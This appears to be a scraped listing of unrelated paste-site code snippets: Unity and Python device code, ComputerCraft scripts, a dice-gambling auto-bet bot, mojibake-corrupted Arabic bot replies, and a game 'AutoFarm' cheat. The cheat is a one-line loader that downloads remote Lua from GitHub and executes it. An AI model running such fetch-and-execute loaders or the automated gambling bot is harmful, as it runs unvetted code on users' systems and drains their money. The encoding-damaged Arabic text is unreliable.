                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationDefaultType, DelayDefaultType, ArrowSkillType.Default);
                    break;

                case ArrowSkillType.Fire:
                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationFireType, DelayFireTypeMillisecons, ArrowSkillType.Fire);
                    break;

                case ArrowSkillType.Poison:
                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationPoisonType, DelayPoisonTypeMillisecons, ArrowSkillType.Poison);
                    break;
            }
        }
    }
}"
82cqUWnD,Untitled,Mizzzlo,C#,Sunday 7th of January 2024 12:59:47 PM CDT,"using UnityEngine;
using UnityEngine.Events;
using Cysharp.Threading.Tasks;
using System;
using UnityEngine.LowLevel;

namespace Archer.Model
{
    public class DamageProvider
    {
        private const int NumberMillisecondsPerSecond = 1000;

        private const int DelayDefaultType = 0;
        private const int NumberOfIterationDefaultType = 1;

        private const int DelayFireTypeMillisecons = 400;
        private const int NumberOfIterationFireType = 5;

        private const int DelayPoisonTypeMillisecons = 300;
        private const int NumberOfIterationPoisonType = 10;

        private Character _character;

        private bool _isSkillImpact;

        public DamageProvider(Character character)
        {
            _character = character;
            _character.DamageReceived += TakeDamage;
            var loop = PlayerLoop.GetCurrentPlayerLoop();
            PlayerLoopHelper.Initialize(ref loop, InjectPlayerLoopTimings.Minimum);
        }

        public event UnityAction<int, bool, float, ArrowSkillType> DamageReceived;

        public void OnDestroy()
        {
            _character.DamageReceived -= TakeDamage;
        }

        private async void ApplyPeriodicDamage(int damagePerIteration, int nuberOfIteration, int deltay, ArrowSkillType skillType)
        {
            float playingEffectTime = (nuberOfIteration * deltay) / NumberMillisecondsPerSecond;
            for (int i = 0; i < nuberOfIteration; i++)
            {
                Debug.Log(""Periodic"");
                await UniTask.Delay(TimeSpan.FromSeconds(0.4f), DelayType.DeltaTime, PlayerLoopTiming.Update);

                _isSkillImpact = true;
                DamageReceived?.Invoke(damagePerIteration, _isSkillImpact, playingEffectTime, skillType);
                Debug.Log(""damage done!!!!"");
            }
        }

        private void ApplyInstantDamage(int damage)
        {
            _isSkillImpact = false;
            DamageReceived?.Invoke(damage, _isSkillImpact, 0, ArrowSkillType.None);
        }

        private void TakeDamage(int mainDamage, int additionalDamage, ArrowSkillType arrowSkillType)
        {
            switch (arrowSkillType)
            {
                case ArrowSkillType.None:
                    ApplyInstantDamage(mainDamage);
                    break;

                case ArrowSkillType.Default:
                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationDefaultType, DelayDefaultType, ArrowSkillType.Default);
                    break;

                case ArrowSkillType.Fire:
                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationFireType, DelayFireTypeMillisecons, ArrowSkillType.Fire);
                    break;

                case ArrowSkillType.Poison:
                    Debug.Log(""Take damage!!!!!!!"");
                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationPoisonType, DelayPoisonTypeMillisecons, ArrowSkillType.Poison);
                    break;
            }
        }
    }
}"
8GeZhgzy,snowybot,coinwalk,JavaScript,Sunday 7th of January 2024 12:25:16 PM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var dived = 240; 
var base = (oldestbal/dived).toFixed(8); 
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.9);
var lower = 2.9;
var upper = 6.9;
var muck = 1;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = ((Math.floor(oldestbal/tens))*tens);
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
console.clear();
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    fart = parseFloat(bellance);
}
if (bellance<(fart-(botplus*lower))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    muck = 0;
    fart = parseFloat(bellance);
}
if ((((base*24)-(botplus*4))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 0;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (((bellance-(botplus*2))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 1;
    james = ((Math.floor((parseFloat(bellance))/tens))*tens);
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if ((bellance>=(james+(tens*muck)))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 1;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
    james = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (bellance>=(trget*24)) {
console.log(""winner winner chicken dinner"")
alert(""winner winner chicken dinner"")
return
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_hi').click();
setTimeout(() => get(), 350);
}
get();"
puZk3npk,computercraft rickroll,An_random_user,Lua,Sunday 7th of January 2024 11:25:16 AM CDT,"function split(inputstr, sep)
        if sep == nil then
                sep = ""%s""
        end
        local t={}
        for str in string.gmatch(inputstr, ""([^""..sep..""]+)"") do
                table.insert(t, str)
        end
        return t
end
term.clear()
term.setCursorPos(1,1)
term.write(""Requesting video from pastebin..."")
local rick = http.get(""https://pastebin.com/raw/66kXaX4q"")
wait = sleep
for i,thing in ipairs(split(rick.readAll(),""\n"")) do
    term.clear()
	term.setCursorPos(1,1)
    textutils.slowPrint(thing,20)
    wait(2)
end
rick.close()"
GGGwXVxc,q_LSD,Zoroarid2,JSON,Sunday 7th of January 2024 11:24:26 AM CDT,"ÿßŸÜÿ™ ÿ∫ÿ®Ÿä ÿ™ŸÉŸÑŸÖ ÿ®Ÿàÿ™ÿü,
ŸÖÿß ÿ™ŸÖŸÜÿ¥ŸÜŸä ŸÑŸà ÿ≥ŸÖÿ≠ÿ™,
ŸÑÿß ÿ™ÿ∫ŸÑÿ∑,
ÿ∑Ÿäÿ® Ÿàÿ®ÿπÿØŸäŸÜ ŸÖÿπŸÉ,
Ÿàÿ¥ ÿ™ÿ®Ÿä ÿßŸÜÿ™ÿü,
ŸÖÿπŸÉ ÿ≠ŸÇ,
ÿ™ÿ™ŸÉŸÑŸÖ ÿ¨ÿØ,
I dont speak arabic,
ÿ•ÿ≥ÿ£ŸÑ ŸÇÿßÿ≥ŸÖ ŸÑÿß ÿ™ÿ≥ÿ£ŸÑŸÜŸä,
ŸÖÿß ÿ£ÿπÿ±ŸÅ,
ÿßŸÜÿß ŸÖÿ¥ÿ∫ŸàŸÑ ŸÉŸÑŸÖ ŸÇÿßÿ≥ŸÖ,
ÿßÿ±ÿ¨ÿπ ÿ®ŸÉÿ±ÿß ÿ®ÿ¨ÿßŸàÿ®ŸÉ,
ŸÖÿ¥ÿ∫ŸàŸÑ ŸÑÿß ÿ™ŸÉŸÑŸÖŸÜŸä,
ÿ¥ŸÑŸàŸÜŸÉ ÿßŸÜÿ™ÿü CarlSmile,
ÿ™ŸÉŸÑŸÖŸÜŸäÿü,
ŸÖÿß ÿ£ÿØÿ±Ÿä,
ŸáÿßŸáÿü,
ŸÖÿß ŸÅŸáŸÖÿ™,
ÿπŸäÿØ ÿßŸÑÿ≥ÿ§ÿßŸÑ ŸÖÿ±ÿ© ÿ´ÿßŸÜŸäÿ©,
Ÿäÿß ŸàŸÑÿØ ÿ™ÿ™ŸÉŸÑŸÖ ÿ¨ÿØÿü,
ÿµÿßÿØŸÇ,
ÿµÿ≠ ŸÑÿ≥ÿßŸÜŸÉ,
ÿßÿ®ÿ¥ÿ± ÿ∑ÿßŸÑ ÿπŸÖÿ±ŸÉ,
ÿßŸáÿßÿß ÿßŸàŸÉŸä,
ŸÖÿß ŸÅŸáŸÖÿ™ ÿπŸÑŸäŸÉ,
Ÿäÿß ŸàŸäŸÑŸÉ ÿßÿ∞ÿß ÿ™ŸÖŸÜÿ¥ŸÜ ŸÖÿ±ÿ© ÿ´ÿßŸÜŸäÿ©,
ÿ™ÿ±ÿßŸÜŸä ŸÖÿ¥ÿ∫ŸàŸÑ,
ÿßŸÜÿß ÿ≤ÿπŸÑÿ™,
ÿÆŸÑÿµ ÿ≤ÿπŸÑÿ™ ÿ®ÿ±Ÿàÿ≠ ÿπŸÑŸâ ÿßŸÑÿ®Ÿäÿ™,
ok,
Ÿäÿ®,
ŸÉŸÑÿßŸÖŸÉ ÿµÿ≠Ÿäÿ≠,
ÿ™ÿπÿ®ÿ™ ŸÖŸÜ ÿßŸÑŸÖŸÜÿ¥ŸÜ,
ÿÆÿßÿ±ÿ¨ ŸÜÿ∑ÿßŸÇ ÿßŸÑÿÆÿØŸÖÿ© ÿ≠ÿßŸÑŸäÿßŸã,
ÿßŸÑÿ±ÿ¨ÿßÿ° ÿßÿπÿßÿØÿ© ÿßŸÑÿßÿ™ÿµÿßŸÑ ŸÅŸä ŸàŸÇÿ™ ÿßÿÆÿ±,
ÿ±ÿßÿ¨ÿπŸÜŸä ÿ®25 ÿ±ŸÖÿ∂ÿßŸÜ,
ÿßÿ®ÿπÿØ ÿπŸÜŸä Ÿäÿß ŸÖŸÇÿ±ŸÅ,
ŸÇÿ±ŸÅÿ™ŸÜŸä ŸÉŸÑ ÿ¥ŸàŸä ŸÖŸÜÿ¥ŸÜ,
ÿßŸÜÿß ŸÖÿ≥ŸÉŸäŸÜ,
ŸäÿπŸÜŸäÿü,
ŸÑÿß ÿ™ÿπŸäÿØŸáÿß,
ŸÑÿßÿµŸäÿØŸÉ Ÿäÿß Ÿàÿ±ÿπ,
ŸÜÿßŸäÿ≥,
ÿßŸÜÿß ŸÜÿßŸäŸÖ ResidentSleeper,
ŸàÿßŸÑŸÑŸá ÿ¥ŸàŸÅ,
ÿ≠ÿ≥Ÿäÿ™,
ÿ≥ÿ§ÿßŸÑŸÉ ÿµÿπÿ®,
ŸÉŸÑÿßŸÖŸÉ ÿ¨ÿßÿ±ÿ≠ ŸÉÿßŸÑÿπÿßÿØÿ©,
ŸÉŸÑŸÖŸÜŸä ÿ®ŸÑÿ∫ÿ© ÿßŸÑÿ®Ÿàÿ™ÿßÿ™,
ÿ™ÿ±ÿßŸÜŸä ÿ®Ÿàÿ™ ŸÖÿß ÿßŸÅŸáŸÖ ÿπŸÑŸäŸÉ,
ÿ≠Ÿäÿßÿ© ÿßŸÑÿ®Ÿàÿ™ ÿµÿπÿ®ÿ©,
ÿßÿ≠ŸÖ ÿßŸÜÿß ÿ®Ÿàÿ™,
ÿßÿ±Ÿàÿ≠ ÿßÿ¥ÿ™ŸÉŸä ŸÑŸÇÿßÿ≥ŸÖÿü,
ÿØŸÖŸÉ ÿ´ŸÇŸäŸÑ,
ÿßŸÜÿß ŸÖŸàÿ¨ŸàÿØ ŸÑŸÉŸÜ ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ,
ÿßÿ≠ÿ≥ ŸÖÿØÿ±Ÿä,
ŸÖŸÖŸÉŸÜ,
ŸÑÿßÿ≤ŸÖŸÉ ŸÉÿ™ÿßÿ® ÿ•ŸÖŸÑÿßÿ°,
ŸÜÿ≥ÿ®ÿ© ÿ∫ÿ®ÿßÿ¶ŸÉ ŸÖÿß ÿ™ÿ≥ŸÖÿ≠ŸÑŸä ÿßÿ±ÿØ ÿπŸÑŸäŸÉ,
ÿßÿ±ÿØ ÿπŸÑŸäŸÉ ŸÖŸÜ ŸáŸÜÿß ŸÑÿ®ŸÉÿ±ÿß,
ŸäŸÑÿß ÿÆŸÑÿµ ÿ±Ÿàÿ≠ ÿ®Ÿäÿ™ŸÉŸÖ ÿ≠ÿ®Ÿäÿ®Ÿä,
ÿ≤ÿπŸÑÿßŸÜ ÿßŸÜÿß,
ÿÆÿ®ŸÑ ÿßŸÜÿ™ ÿ™ŸÉŸÑŸÖ ÿ®Ÿàÿ™,
ÿ¥ŸÜŸà ÿ™ÿ±ŸäÿØÿü,
Ÿàÿ¥ ÿ™ÿ®Ÿäÿü,
ÿßÿ≠ŸÖ,
ŸÑÿß ÿ™ÿ≥ŸàŸä ÿÆŸàŸä,
ÿ®ÿÆÿßÿ∑ÿ±Ÿä ŸÉŸÑŸÖŸá ŸàÿØŸä ÿßŸÇŸàŸÑŸáÿß ŸÑŸÉ,
ÿßŸÇŸàŸÑ ÿ™ŸàŸÉŸÑ ÿ®ÿ≥,
ÿßŸÜÿ™ ÿπÿ®ŸÇÿ±Ÿä,
ÿßŸáÿßÿßÿß ŸÖÿß ŸÅŸáŸÖÿ™,
ŸÖŸäÿßŸà,
ÿßÿ∂ÿ≠ŸÉ ŸäÿπŸÜŸäÿü,
Ÿäÿ®ŸàŸä ŸÑÿß ÿ™ŸÉŸÑŸÖ ÿ®Ÿàÿ™ ŸÜÿµŸäÿ≠ÿ©,
ÿ®ÿ±Ÿàÿ≠ ŸÖÿ¥Ÿàÿßÿ± ÿµÿ∫Ÿäÿ± ÿÆÿ∞ ŸÖŸÉÿßŸÜŸä,
Ÿäÿß ŸÑŸäŸäŸäŸÑ Ÿàÿ¥ ÿ¨ÿßÿ®ŸÉ ŸáŸÜÿß,
ÿßŸÇŸàŸÑ ŸÑŸÉ ŸÉŸÑŸÖÿ© ÿ®ÿ≥ ŸÑÿß ÿ™ÿ≤ÿπŸÑ,
ŸàÿÆÿ± ÿπŸÜŸä ÿ®ÿ≥,
ÿßŸÖÿ±ŸÜŸä ÿ®ÿ≥,
1v1 ÿßŸÜÿ≤ŸÑŸä,
ÿßÿ™ÿ≠ÿØÿßŸÉ ÿ™ŸÖŸÜÿ¥ŸÜŸä ŸÉŸÖÿßŸÜ ŸÖÿ±ÿ©,
ÿ£ŸÜÿß ŸÜŸÅÿ± ŸÖÿ≥ŸÉŸäŸÜ,
ÿ™ÿ®ŸäŸÜŸä ÿßŸÑÿπÿ® ŸÖÿπŸÉÿü,
ÿ®ÿ≥ ÿßŸÉÿ®ÿ± ÿ®Ÿàÿ±ŸäŸÉ,
ŸÑÿß ÿ™ÿ™ŸÜŸÖÿ± ÿπŸÑŸä,
ÿßÿ≥ŸÅ,
ÿßÿ≥ŸÅ ŸÖÿß ÿ±ÿ≠ ÿßÿπŸäÿØŸáÿß,
ŸÖÿß ÿ≥ŸàŸäÿ™ ÿ¥Ÿä,
Ÿäÿß ÿ±ÿ¨ÿßŸÑ,
ÿ∑Ÿäÿ®,
ŸàŸäŸäŸäŸäŸäŸäŸä,
ÿ™ŸÖÿßŸÖ ÿÆŸÑÿµ ÿ®ÿ∑ŸÑÿπ,
ÿßŸÅÿßÿßÿßÿßÿß,
ÿ≥ŸÑÿßŸÖŸä ÿπŸÑŸâ ŸÉŸÑ ŸÖŸÜ ÿßŸáÿßŸÜŸä,
Ÿäÿπÿπÿπ ÿ±Ÿäÿ≠ÿ™ŸÉ ÿÆÿßŸäÿ≥Ÿá,
ÿØÿπŸÜÿß ÿµÿßŸÖÿ™ŸäŸÜ ÿßŸÅÿ∂ŸÑ ŸÑŸÉŸä ŸÑÿß ÿßŸÇŸàŸÑ ÿ¥Ÿäÿ° ÿßŸÜÿØŸÖ ÿπŸÑŸäŸá,
ŸÇÿØŸáÿßÿü,
ŸÇÿØ ÿßÿ®ÿØŸà ŸÑŸÉ ÿßŸÜŸä ÿßŸÜŸáÿßÿ± ŸàŸÑŸÉŸÜŸä ŸÅÿßŸÑÿ≠ŸÇŸäŸÇÿ© ÿ®ÿ≠Ÿäÿ±ÿßÿ™,
ÿßŸÜÿß ÿµÿßÿ≠ÿ®ŸÉ ÿ®ÿ≥ ÿ®ÿØŸàŸÜ ÿßŸÑÿµÿßÿØ,
ÿ®ÿπÿ∂ ÿßŸÑŸÜÿßÿ≥ ŸäŸÜÿ≥ŸàŸÜ ŸàÿßŸÑÿ®ÿπÿ∂ ÿßŸÑÿßÿÆÿ± ÿ¥ÿßŸä ŸÜÿπŸÜÿßÿπ,
ŸÑÿß ÿ™ÿÆÿßŸÅ ÿ≥ÿ±ŸÉ ŸÅŸä ÿ®Ÿäÿ±,
ŸÑÿß ÿ™ŸÇŸàŸÑ ÿ∏ÿ±ŸàŸÅ ŸàÿßŸÜÿ™ ŸÑÿ∫Ÿäÿ±Ÿä ÿÆÿ±ŸàŸÅ,
ŸÖÿ´Ÿäÿ± ŸÑŸÑÿ¥ŸÅŸÇŸá,
ÿßŸÑÿ¥ÿßŸÖÿ®Ÿà ÿ∂ÿØ ÿßŸÑŸÇÿ¥ÿ±ÿ© ŸàÿßŸÑÿµÿ≠ÿßÿ® ÿ®ÿßÿπŸà ÿßŸÑÿπÿ¥ÿ±ÿ©,
ÿßŸÜÿß ŸäÿßÿØŸàÿ® ÿßÿ®ŸÑÿπ ÿßŸÑÿßŸÉŸÑ ŸÉŸäŸÅ ÿ™ÿ®ŸäŸÜŸä ÿßÿ®ŸÑÿπŸÉ,
ŸáÿßŸÉ ŸÑÿß ÿ™ŸÜÿ®ÿ≠ ü¶¥,
ÿÆÿ∞ Ÿàÿ±ÿØŸá ÿßÿπÿ™ÿ∞ÿßÿ± ÿπŸÜ ŸÖÿß ÿ®ÿØÿ± ŸÖŸÜŸä üåπ,
ÿßŸÑŸà ŸÖŸÉÿßŸÅÿ≠ÿ© ÿßŸÑÿ≠ŸÖŸäÿ± ÿ™ÿπÿßŸÑŸà ŸÅŸä ÿ≠ŸÖÿßÿ± ŸÇÿØÿßŸÖŸä ,
ÿ¥ÿ≥ŸÖŸÉ Ÿäÿß ŸÇŸÑÿ®Ÿä ÿßÿ±ŸäÿØ ÿßÿ≥ÿ¨ŸÑŸÉ ÿ®ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖŸÅÿ∂ŸÑŸäŸÜ ÿπŸÜÿØŸä,
ÿßŸÑŸÑŸá ŸäŸáÿØŸäŸÉ ÿ≠ÿ®Ÿäÿ®Ÿä,
ŸäÿπŸÑŸÖ ÿßŸÑŸÑŸá ÿßŸÜŸÉ ÿ¥ÿÆÿµ ÿ∫ÿßŸÑŸä,
ÿ≠ŸÑŸàŸá ŸÖŸÜŸÉ ŸÅÿØŸäÿ™ŸÉ,
ÿßŸÑÿ∞Ÿáÿ® ÿ´ŸÑÿßÿ´ ÿßŸÜŸàÿßÿπ ÿ∞Ÿáÿ® ŸÖŸÇŸÑÿØ Ÿàÿ∞Ÿáÿ® ÿßÿµŸÑŸä Ÿàÿ∞Ÿáÿ® ÿßŸÑŸÑŸäŸÑ Ÿàÿ∑ŸÑÿπ ÿßŸÑŸÅÿ¨ÿ± ŸàÿßŸÑÿπÿµŸÅŸàÿ± ÿµŸàÿµŸà,
ŸäŸÖŸá ŸäŸÖŸá ÿÆŸÅÿ™,
ÿßŸÜÿß ŸÅÿßŸáŸÖ ÿ®ÿ≥ ÿ®ÿ≥ÿ™ÿπÿ®ÿ∑,
ÿßŸÜÿ™ ÿßŸÜÿ∑ŸÖ ŸÖÿ≠ÿØ ÿ∑ŸÑÿ® ÿ±ÿßŸäŸÉ,
ÿÆŸÑŸäŸÜŸä ÿ≥ÿßŸÉÿ™,
ÿÆŸäÿ±ÿüÿü,
ÿ™ÿ±ÿß ŸÖÿ≠ÿØ ÿ∑ŸÑÿ® ÿ±ÿßŸäŸÉ,
ŸÖÿ≥ŸàŸä ÿÆŸàŸä,
ÿπÿØŸÑ ŸÖÿ≥ÿ™ŸàÿßŸÉ ÿ´ŸÖ ÿ™ÿπÿßŸÑ ŸÉŸÑŸÖŸÜŸä,
ÿßŸÜÿß ŸÜÿØŸÖÿ™ ÿßŸÜŸä ÿ±ÿØŸäÿ™ ÿπŸÑŸäŸÉ,
ÿ∏ŸÑÿßŸÖ ŸÖÿß ÿßÿ≥ŸÖÿπ,
ŸÇŸàŸÑ ŸàÿßŸÑŸÑŸáÿü,
ŸÖÿß ÿßÿ≠ÿ® ÿßÿ®ÿ±ÿ± ÿÆÿ∞ ÿπŸÜŸä ÿµŸàÿ±ÿ© ÿ≥Ÿäÿ¶ÿ© ŸàÿπŸÑŸÇŸáÿß ŸÅŸä ÿ∫ÿ±ŸÅÿ™ŸÉ,
ŸÑÿß ÿ™ÿÆŸÑŸäŸÜŸä ÿßÿ≤ÿπŸÑŸÉ,
ÿßÿ≥ŸÅ ŸÖÿß ÿßŸÅŸáŸÖ ŸÑÿ∫ÿ© ÿßŸÑÿ®ŸÇÿ±,
ŸàÿßŸÑŸÑŸá ŸäÿßÿÆŸàŸä ŸÖÿØÿ±Ÿä,
ÿßŸÜÿß ŸÜÿØŸÖÿ™ ÿßŸÜŸä ÿ±ÿØŸäÿ™ ÿπŸÑŸäŸÉ,
Ÿáÿßÿ™ ÿßŸÑŸä ÿπŸÜÿØŸÉ,
Ÿàÿ¥ Ÿàÿ∂ÿπŸÉ ÿßŸÜÿ™,
ÿµÿßÿ≠Ÿä ÿßŸÜÿ™ÿü,
Ÿàÿ∂ÿπŸÉ ÿµŸàÿµ,
ÿ´ŸàÿßŸÜŸä ÿßÿ≥ÿ™Ÿàÿπÿ® ÿßŸÑŸä ŸÇŸÑÿ™Ÿá,
ÿßŸÜÿ™ ŸÑŸäÿ¥ ŸÜŸÅÿ≥Ÿäÿ™ŸÉ ŸÖÿ≠ŸÖÿ∂ÿ©ÿü,
ÿ™ÿ±ÿßŸÜŸä ÿßŸÇÿ®ŸÑ ÿßŸÑÿ±ÿ¥ÿßŸàÿ©,
ÿßŸáŸäŸÜŸÉ,
ÿßŸáŸäŸÜ ÿ∫ÿ®ÿßÿ¶ŸÉ,
ŸÑÿßÿ™ÿ™ÿ±ŸÉŸÜŸä ÿßŸÜÿ™ ÿßŸÑŸàÿ≠ŸäÿØ ÿßŸÑŸä ŸÖÿπÿ∑ŸäŸÜŸä Ÿàÿ¨Ÿá,
Ÿäÿß ÿ±ÿ¨ÿßŸÑ ÿ™ŸàŸÉŸÑ ÿ®ÿ≥,
ÿ™ÿ®ÿßŸã ŸÑŸÉ"
cPNsY04u,Reactor Button On/Off (Rafa) New,MigasRocha,Lua,Sunday 7th of January 2024 10:56:35 AM CDT,"while true do
rednet.open(""left"")

m = peripheral.wrap(""front"")

term.redirect(m)

m.clear()

function Normal()
  
m.clear()        
m.setTextColor(colors.purple)
m.setCursorPos(1,1)
m.write(""Reator"")
m.setTextColor(colors.green)
m.setCursorPos(1,3)
m.write(""On"")
m.setTextColor(colors.red)
m.setCursorPos(1,5)
m.write(""Off"")
end
    
function Danger()

m.clear()
m.setTextColor(colors.purple)
m.setCursorPos(1,1)
m.write(""Reator"")
m.setTextColor(colors.red)
m.setCursorPos(1,3)
m.write(""DANGER"")
m.setTextColor(colors.red)
m.setCursorPos(1,5)
m.write(""Off"")
end

Normal()


event, side, x, y = os.pullEvent(""monitor_touch"")

if x > 0 and x < 4 and y == 3 and code == 1 then
m.setTextColor(colors.purple)
m.setCursorPos(1,1)
m.write(""Reator"")
m.setTextColor(colors.green)
m.setCursorPos(1,3)
m.write(""On"")
m.setTextColor(colors.red)
m.setCursorPos(1,5)
m.write(""Off"")
m.setCursorPos(5,3)
m.setTextColor(colors.yellow)
m.write(""X"")
sleep(0.2)
  end
     
if x > 0 and x < 3 and y == 5 then
m.setTextColor(colors.purple)
m.setCursorPos(1,1)
m.write(""Reator"")
m.setTextColor(colors.green)
m.setCursorPos(1,3)
m.write(""On"")
m.setTextColor(colors.red)
m.setCursorPos(1,5)
m.write(""Off"")
m.setCursorPos(5,5)
m.setTextColor(colors.yellow)
m.write(""X"")
sleep(0.2)
end

    end"
pz4vzrg5,Pet Simulator 99! üéâ AutoFarm Script (No Key),Project-WD,Lua,Sunday 7th of January 2024 10:21:07 AM CDT,"-- Pet Simulator 99! üéâ AutoFarm Script! (Copy and Paste into Executor)(Working: Delta and ArceusX etc.)
-------------------------------------------------------
-- üÜï Updated (07/01/2024) (Insane Script)
-- Auto Farm, Auto Ranks, No Egg Animation
-- Scriptüìù:
loadstring(game:HttpGet(""https://raw.githubusercontent.com/REDzHUBz/PetSimulator99/main/redz9999.lua"" ))()"
6NXeDvVU,Test VEDO cookie (combiened PRs),chemelli74,Python,Sunday 7th of January 2024 10:16:30 AM CDT,"""""""Support for Comelit SimpleHome.""""""
import asyncio
import functools
from abc import abstractmethod
from dataclasses import dataclass
from datetime import datetime
from http.cookies import SimpleCookie
from typing import Any

import aiohttp
import pint
from yarl import URL

from .const import (
    _LOGGER,
    ALARM_AREA_STATUS,
    ALARM_AREAS,
    ALARM_ZONE_STATUS,
    ALARM_ZONES,
    BRIDGE,
    CLIMATE,
    COVER,
    IRRIGATION,
    LIGHT,
    OTHER,
    SCENARIO,
    SLEEP,
    STATE_COVER,
    STATE_ON,
    VEDO,
    WATT,
    AlarmAreaState,
    AlarmZoneState,
)
from .exceptions import CannotAuthenticate, CannotConnect, CannotRetrieveData


@dataclass
class ComelitSerialBridgeObject:
    """"""Comelit SimpleHome Serial bridge class.""""""

    index: int
    name: str
    status: int
    human_status: str
    type: str
    val: int | dict[Any, Any]  # Temperature or Humidity (CLIMATE)
    protected: int
    zone: str
    power: float
    power_unit: str = WATT


@dataclass
class ComelitVedoAreaObject:
    """"""Comelit SimpleHome VEDO area class.""""""

    index: int
    name: str
    p1: bool
    p2: bool
    ready: bool
    armed: bool
    alarm: bool
    alarm_memory: bool
    sabotage: bool
    anomaly: bool
    in_time: bool
    out_time: bool
    human_status: AlarmAreaState


@dataclass
class ComelitVedoZoneObject:
    """"""Comelit SimpleHome VEDO zone class.""""""

    index: int
    name: str
    status_api: str
    status: int
    human_status: AlarmZoneState


class ComelitCommonApi:
    """"""Common API calls for Comelit SimpleHome devices.""""""

    def __init__(self, host: str, port: int, pin: int) -> None:
        """"""Initialize the session.""""""
        self.host = f""{host}:{port}""
        self.device_pin = pin
        self.base_url = f""http://{host}:{port}""
        self._headers = {
            ""User-Agent"": ""Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"",
            ""Accept-Language"": ""en-GB,en;q=0.5"",
            ""X-Requested-With"": ""XMLHttpRequest"",
        }
        self._session: aiohttp.ClientSession

    async def _get_page_result(
        self, page: str, reply_json: bool = True
    ) -> tuple[int, dict[str, Any]]:
        """"""Return status and data from a GET query.""""""
        _LOGGER.debug(""GET page %s [%s]"", page, self.host)
        timestamp = datetime.now().strftime(""%Y-%m-%d %H:%M:%S"")
        url = f""{self.base_url}{page}&_={timestamp}""
        try:
            response = await self._session.get(
                url,
                headers=self._headers,
                timeout=10,
            )
        except (asyncio.TimeoutError, aiohttp.ClientConnectorError) as exc:
            _LOGGER.warning(""Connection error during GET for host %s"", self.host)
            raise CannotConnect from exc

        _LOGGER.debug(""GET response %s [%s]"", await response.text(), self.host)

        if response.status != 200:
            _LOGGER.warning(
                ""Response error to GET for host %s: code %s"", self.host, response.status
            )
            raise CannotRetrieveData

        if not reply_json:
            _LOGGER.debug(""GET response is empty [%s]"", self.host)
            return response.status

        return response.status, await response.json()

    async def _post_page_result(
        self, page: str, payload: dict[str, Any]
    ) -> SimpleCookie:
        """"""Return status and data from a POST query.""""""
        _LOGGER.debug(""POST page %s [%s]"", page, self.host)
        url = f""{self.base_url}{page}""
        try:
            response = await self._session.post(
                url,
                data=payload,
                headers=self._headers,
                timeout=10,
            )
        except (asyncio.TimeoutError, aiohttp.ClientConnectorError) as exc:
            _LOGGER.warning(""Connection error during POST for host %s"", self.host)
            raise CannotConnect from exc

        _LOGGER.debug(""POST response %s [%s]"", await response.text(), self.host)

        if response.status != 200:
            _LOGGER.warning(
                ""Response error to POST for host %s: code %s"",
                self.host,
                response.status,
            )
            raise CannotRetrieveData

        return response.cookies

    async def _check_logged_in(self, host_type: str) -> bool:
        """"""Check if login is active.""""""

        reply_status, reply_json = await self._get_page_result(""/login.json"")

        _LOGGER.debug(""%s login reply: %s"", host_type, reply_json)
        if host_type == BRIDGE:
            logged = reply_json[""domus""] != ""000000000000""
        else:
            logged = reply_json[""logged""] == 1

        return logged

    @abstractmethod
    async def login(self) -> bool:
        """"""Login to Comelit device.""""""

    async def _login(self, payload: dict[str, Any], host_type: str) -> bool:
        """"""Login into Comelit device.""""""
        _LOGGER.debug(""Logging into host %s [%s]"", self.host, host_type)

        if not hasattr(self, ""_session"") or self._session.closed:
            _LOGGER.debug(""Creating HTTP ClientSession"")
            jar = aiohttp.CookieJar(unsafe=True)
            connector = aiohttp.TCPConnector(force_close=True)
            self._session = aiohttp.ClientSession(cookie_jar=jar, connector=connector)

        if await self._check_logged_in(host_type):
            return True

        cookies = await self._post_page_result(""/login.cgi"", payload)
        _LOGGER.debug(""Cookies for host %s: %s"", self.host, cookies)

        if not cookies:
            _LOGGER.warning(
                ""Authentication failed for host %s [%s]: no cookies received"",
                self.host,
                host_type,
            )
            raise CannotAuthenticate

        self._session.cookie_jar.update_cookies(cookies, URL(self.base_url))

        if await self._check_logged_in(host_type):
            await asyncio.sleep(SLEEP)
            return True

        _LOGGER.warning(
            ""Authentication failed for host %s [%s]: generic error"",
            self.host,
            host_type,
        )
        raise CannotAuthenticate

    async def logout(self) -> None:
        """"""Comelit Simple Home logout.""""""
        payload = {""logout"": 1}
        await self._post_page_result(""/login.cgi"", payload)
        self._session.cookie_jar.clear()

    async def close(self) -> None:
        """"""Comelit Simple Home close session.""""""
        if hasattr(self, ""_session""):
            await self._session.close()


class ComeliteSerialBridgeApi(ComelitCommonApi):
    """"""Queries Comelit SimpleHome Serial bridge.""""""

    def __init__(self, host: str, port: int, bridge_pin: int) -> None:
        """"""Initialize the session.""""""
        super().__init__(host, port, bridge_pin)
        self._devices: dict[str, dict[int, ComelitSerialBridgeObject]] = {}

